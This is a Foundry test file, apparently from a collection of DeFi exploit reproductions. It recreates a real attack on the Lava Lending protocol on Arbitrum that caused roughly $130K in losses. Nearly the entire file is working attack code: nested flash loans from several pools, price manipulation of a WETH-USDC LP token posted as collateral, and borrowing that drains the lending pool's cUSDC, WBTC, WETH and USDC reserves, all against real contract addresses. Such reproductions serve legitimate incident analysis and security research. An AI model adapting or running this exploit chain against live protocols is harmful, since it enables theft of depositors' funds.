// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1 USDC, 125795.6 cUSDC, 0,0067 WBTC, 2.25 WETH (~$130K USD)
// Attacker : https://arbiscan.io/address/0x8a0dfb61cad29168e1067f6b23553035d83fcfb2
// Attack Contract : https://arbiscan.io/address/0x69fa61eb4dc4e07263d401b01ed1cfceb599dab8#code
// Vulnerable Contract : https://arbiscan.io/address/0x6700b021a8bcfae25a2493d16d7078c928c13151
// Attack Tx : https://arbiscan.io/tx/0xb5cfa4ae4d6e459ba285fec7f31caf8885e2285a0b4ff62f66b43e280c947216
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant AlgebraPool = 0x8cc8093218bCaC8B1896A1EED4D925F6F6aB289F;
address constant AlgebraPool2 = 0xc86Eb7B85807020b4548EE05B54bfC956eEbbfCD;
address constant WETHUSDC_LP = 0x6700b021a8bCfAE25A2493D16d7078c928C13151;
address constant aavePoolV3 = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
address constant SwapFlashLoan = 0x9Dd329F5411466d9e0C488fF72519CA9fEf0cb40;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant LendingPool = 0x3Ff516B89ea72585af520B64285ECa5E4a0A8986;
address constant AaveOracle = 0x11A8598c4430C7663fdA224C877f231895C8CA69;
address constant aUsdceWethLP = 0x2254898d99e3BBB1D10F784e2678d59d88f70f1E;
address constant UniswapV3Pool = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443;
address constant UniswapV3Router2 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;

address constant usdc = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
address constant weth = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
address constant aaveUSDC = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;
address constant cUSDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
address constant aUSDC = 0x56EA05C0C3b665F67538909343Fb3Becb4fE5714;
address constant aWBTC = 0x5E166A3A9ebCAfE9CF62cC2BD2Cf41a109dE18Af;
address constant wbtc = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
address constant aWETH = 0x7cB47F4F634fa0f8165de2fE3528471BD127533A;
address constant aUSDCe = 0xe879A4B54396Aebb3416bc72A1Ab1D360C2CAFf6;

contract LavaLending_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("arbitrum", 259_645_908 - 1);

        vm.label(attacker, "attacker");
        vm.label(AlgebraPool, "AlgebraPool");
        vm.label(WETHUSDC_LP, "WETHUSDC_LP");
        vm.label(aavePoolV3, "aavePoolV3");
        vm.label(usdc, "usdc");
        vm.label(weth, "weth");
        vm.label(aaveUSDC, "aaveUSDC");
        vm.label(cUSDC, "cUSDC");
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attackerC = new AttackerC();
        vm.label(address(attackerC), "attackerC");

        attackerC.attack();

        console.log("Final balance in usdc :", IERC20(usdc).balanceOf(attacker));
        console.log("Final balance in cUSDC:", IERC20(cUSDC).balanceOf(attacker));
        console.log("Final balance in wbtc :", IERC20(wbtc).balanceOf(attacker));
        console.log("Final balance in weth :", IERC20(weth).balanceOf(attacker));
    }
}

contract AttackerC {
    address attacker;

    function attack() external {
        attacker = msg.sender;

        uint256 AlgebraPool_USDC_bal = IERC20(usdc).balanceOf(AlgebraPool); // L1
        // IERC20(usdc).approve(WETHUSDC_LP, type(uint256).max); // L3
        // IERC20(weth).approve(WETHUSDC_LP, type(uint256).max); // L6

        IFS(AlgebraPool).flash( // L9
            address(this), // recipient
            0, // amount0
            AlgebraPool_USDC_bal, // amount1
            hex"000000000000000000000000000000000000000000000000000002653038614a"
        );

        IERC20(usdc).transfer( // L1096
            msg.sender,
            IERC20(usdc).balanceOf(address(this)) // L1094
        );
        IERC20(cUSDC).transfer( // L1101
            msg.sender,
            IERC20(cUSDC).balanceOf(address(this)) // L1099
        );
        IERC20(wbtc).transfer( // L1104
            msg.sender,
            IERC20(wbtc).balanceOf(address(this)) // L1107
        );
        IERC20(weth).transfer( // L1111
            msg.sender,
            IERC20(weth).balanceOf(address(this)) // L1113
        );
    }

    // 1 flashloan with AlgebraPool
    function algebraFlashCallback(uint256, uint256 fee1, bytes calldata data) external {
        // L16
        uint256 usdc_bal = IERC20(usdc).balanceOf(aaveUSDC); // L17

        address[] memory assets = new address[](3);
        assets[0] = weth;
        assets[1] = cUSDC;
        assets[2] = usdc;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1_500_000_000_000_000_000_000;
        amounts[1] = 8_000_000_000_000;
        amounts[2] = usdc_bal - 2_000_000_000;

        IFS(aavePoolV3).flashLoan( // L19
            address(this), // receiverAddress
            assets, // assets
            amounts, // amounts
            new uint256[](3), // interestRateModes
            address(this), // onBehalfOf
            "", // params
            0 // referralCode
        );

        IERC20(usdc).transfer(AlgebraPool, 2_633_887_316_134); // L1083
    }

    // 2 flashloan with aavePoolV3
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // L51
        uint256 usdc_bal = IERC20(usdc).balanceOf(SwapFlashLoan); // L52

        IFS(SwapFlashLoan).flashLoan( // L54
            address(this), // receiver
            usdc, // token
            10_000_000, // amount
            "" // params
        );

        IERC20(usdc).approve(aavePoolV3, type(uint256).max); // L1024
        IERC20(weth).approve(aavePoolV3, type(uint256).max); // L1027
        IERC20(cUSDC).approve(aavePoolV3, type(uint256).max); // L1030

        return true;
    }

    // 3 flashloan with SwapFlashLoan
    function executeOperation(
        address pool,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external {
        // L61
        uint256 usdc_bal = IERC20(usdc).balanceOf(balancerVault); // L62

        address[] memory tokens = new address[](1);
        tokens[0] = usdc;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = usdc_bal;

        IFS(balancerVault).flashLoan( // L64
        address(this), tokens, amounts, "");

        IERC20(usdc).transfer(SwapFlashLoan, amount + fee); // L1018
    }

    // 4 flashloan with balancerVault
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // L71
        uint256 usdc_bal = IERC20(usdc).balanceOf(address(this)); // L72

        IERC20(usdc).approve(WETHUSDC_LP, type(uint256).max); // L74
        IERC20(weth).approve(WETHUSDC_LP, type(uint256).max); // L77

        uint256 usdc_bal2 = IERC20(usdc).balanceOf(address(this)); // L80
        uint256 weth_bal = IERC20(weth).balanceOf(address(this)); // L82

        IFS(WETHUSDC_LP).deposit( // L84
            1_403_852_271_412_498_423_040, // startKey
            3_588_180_725_760, // assetType
            0, // vaultId
            0 // quantizedAmount
        );

        IERC20(WETHUSDC_LP).approve(LendingPool, type(uint256).max); // L167
        uint256 WETHUSDC_LPBal = IERC20(WETHUSDC_LP).balanceOf(address(this)); // L171

        IFS(LendingPool).deposit( // L174
            WETHUSDC_LP, // asset
            WETHUSDC_LPBal, // amount
            address(this), // onBehalfOf
            0 // referralCode
        );

        IFS(LendingPool).getUserAccountData(address(this)); // L210

        IFS(AaveOracle).getAssetPrice(usdc); // L242

        AttackerC2 attackerC2 = new AttackerC2(); // L248

        IERC20(cUSDC).transfer(address(attackerC2), 6_492_300_768_118); // L249

        attackerC2.attack(); // L252

        uint256 WETHUSDC_LP_bal = IERC20(WETHUSDC_LP).balanceOf(aUsdceWethLP); // L370

        IFS(LendingPool).withdraw( // L373
        WETHUSDC_LP, WETHUSDC_LP_bal, address(this));

        uint256 usdc_bal3 = IERC20(usdc).balanceOf(address(this)); // L408
        uint256 weth_bal2 = IERC20(weth).balanceOf(address(this)); // L410

        IFS(WETHUSDC_LP).compound(); // L412

        IFS(WETHUSDC_LP).withdraw(WETHUSDC_LPBal); // L428

        IFS(WETHUSDC_LP).deposit( // L451
            2_246_163_634_259_997_476, // startKey
            5_741_089_161, // assetType
            0, // vaultId
            0 // quantizedAmount
        );

        IERC20(usdc).approve(UniswapV3Pool, type(uint256).max); // L487
        IERC20(weth).approve(UniswapV3Pool, type(uint256).max); // L490

        uint256 weth_bal3 = IERC20(weth).balanceOf(address(this)); // L493

        IFS(UniswapV3Pool).swap( // L495
        address(this), true, int256(weth_bal3), 3_485_594_667_521_387_551_771_586, "");

        IFS(UniswapV3Pool).flash( // L508
            address(this), // recipient
            1_000_000_000_000_000_000, // amount0
            0, // amount1
            ""
        );

        uint256 WETHUSDC_LP_bal2 = IERC20(WETHUSDC_LP).balanceOf(address(this)); // L525

        IFS(WETHUSDC_LP).withdraw(WETHUSDC_LP_bal2); // L528

        IFS(UniswapV3Pool).swap( // L589
            address(this),
            false,
            int256(881_716_015_644),
            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_000,
            ""
        );

        uint256 balcUSDC = IERC20(cUSDC).balanceOf(aUSDC); // L602
        IFS(LendingPool).borrow( // L604
        cUSDC, balcUSDC, 2, 0, address(this));

        uint256 balwbtc = IERC20(wbtc).balanceOf(aWBTC); // L671
        IFS(LendingPool).borrow( // L674
        wbtc, balwbtc, 2, 0, address(this));

        uint256 balweth = IERC20(weth).balanceOf(aWETH); // L764
        IFS(LendingPool).borrow( // L766
        weth, balweth, 2, 0, address(this));

        uint256 balusdc = IERC20(usdc).balanceOf(aUSDCe); // L861
        IFS(LendingPool).borrow( // L863
        usdc, balusdc, 2, 0, address(this));

        uint256 balwethThis = IERC20(weth).balanceOf(address(this)); // L970

        IERC20(cUSDC).approve(UniswapV3Router2, type(uint256).max); // L972

        IFS.ExactOutputSingleParams memory params = IFS.ExactOutputSingleParams(
            cUSDC,
            weth,
            500,
            address(this),
            1_755_639_896_171_187_086,
            type(uint256).max,
            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_000
        );

        IFS(UniswapV3Router2).exactOutputSingle(params); // L975

        uint256 balusdc2 = IERC20(usdc).balanceOf(address(this)); // L989

        IFS(AlgebraPool2).swap( // L991
            address(this), // recipient
            true, // zeroToOne
            int256(-4_402_600_766), // amountRequired
            4_295_129_000, // limitSqrtPrice
            "" // data
        );

        IERC20(usdc).transfer(balancerVault, 1_255_587_859_253); // L1012
    }

    uint256 n;

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (n == 0) {
            IERC20(weth).transfer(UniswapV3Pool, uint256(amount0Delta)); // L502
        }
        if (n == 1) {
            IERC20(usdc).transfer(UniswapV3Pool, uint256(amount1Delta)); // L596
        }

        n++;
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // L516
        IERC20(weth).transfer(UniswapV3Pool, 1_300_000_000_000_000_000); // L517
    }

    function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        // L1001
        IERC20(cUSDC).transfer(AlgebraPool2, uint256(amount0Delta)); // L1002
    }
}

contract AttackerC2 {
    function attack() external {
        IERC20(cUSDC).approve(LendingPool, type(uint256).max); // L253

        uint256 usdc_bal = IERC20(cUSDC).balanceOf(address(this)); // L256

        IFS(LendingPool).deposit( // L258
            cUSDC, // asset
            usdc_bal, // amount
            address(this), // onBehalfOf
            0 // referralCode
        );

        IFS(LendingPool).borrow( // L296
            WETHUSDC_LP, // asset
            430_623_991_193_131_340, // amount
            2, // interestRateMode
            0, // referralCode
            address(this) // onBehalfOf
        );

        uint256 WETHUSDC_LP_bal = IERC20(WETHUSDC_LP).balanceOf(address(this)); // L363

        IERC20(WETHUSDC_LP).transfer(msg.sender, WETHUSDC_LP_bal); // L366
    }
}

interface IFS is IERC20 {
    // AlgebraPool
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;

    // aavePoolV3
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    // SwapFlashLoan
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;

    // balancerVault
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // WETH-USDC LP
    function deposit(uint256 startKey, uint256 assetType, uint256 vaultId, uint256 quantizedAmount) external payable;

    function compound() external;

    function withdraw(
        uint256
    ) external;

    // LendingPool
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function getUserAccountData(
        address user
    )
        external
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function withdraw(address asset, uint256 amount, address to) external returns (uint256);

    // AaveOracle
    function getAssetPrice(
        address asset
    ) external view returns (uint256);

    // UniswapV3Pool
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    // UniswapV3Router2
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(
        ExactOutputSingleParams calldata params
    ) external payable returns (uint256 amountIn);
}
